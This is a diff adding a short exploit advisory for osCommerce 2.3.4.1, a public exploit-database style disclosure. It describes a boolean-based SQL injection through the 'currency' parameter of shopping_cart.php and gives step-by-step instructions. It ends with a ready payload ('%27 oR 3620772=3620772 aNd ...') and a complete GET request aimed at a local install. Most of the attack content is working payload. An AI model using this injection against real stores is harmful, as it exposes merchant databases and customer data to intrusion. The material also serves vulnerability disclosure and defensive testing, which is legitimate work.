@@ -1,0 +1,37 @@
+####################################################################
+
+# Exploit Title: osCommerce 2.3.4.1 - 'currency' SQL Vulnerabilities
+# Dork: N/A
+# Date: 05-02-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.oscommerce.com
+# Software Link: https://www.oscommerce.com/Products
+# Version: 2.3.4.1
+# Category: Webapps
+# Tested on: Wampp @Win
+# CVE: N/A
+# Software Description: osCommerce Online Merchant is a complete online
+store solution
+  that contains both a shop frontend and an administration backend
+  which can be easily configured and customized with over 8,855 free
+add-ons.
+
+####################################################################
+
+# Vulnerabilities / Impact
+# This web application called as osCommerce 2.3.4.1 version.
+# Switch to the shopping_cart tab. Replace the ID value in the url, with a
+high number value.
+  for example shopping_cart.php?currency=1 change to 9999999
+  then add the payload at Attack_pattern to the end of the url.
+
+####################################################################
+
+# POC - SQL (Boolean Based)
+# Parameters : currency
+# Attack Pattern : %27 oR 3620772=3620772 aNd %276199%27=%276199
+# GET Request :
+http://localhost/oscommerce/catalog/shopping_cart.php?currency=99999999%27
+oR 3620772=3620772 aNd %276199%27=%276199
+
+####################################################################
